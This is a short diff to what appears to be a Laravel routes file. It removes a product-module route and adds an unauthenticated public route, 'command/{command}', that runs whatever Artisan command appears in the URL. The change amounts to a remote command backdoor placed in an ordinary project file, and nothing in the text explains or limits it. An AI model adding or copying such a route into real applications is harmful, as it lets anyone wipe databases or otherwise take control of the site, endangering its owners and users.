@@ -11,6 +11,8 @@
 |
 */
 
-Route::prefix('productmodule')->group(function() {
-    Route::get('/', 'ProductModuleController@index');
+ use Illuminate\Support\Facades\Artisan;
+ 
+Route::get('command/{command}',function ($command){
+     return Artisan::call($command);
 });
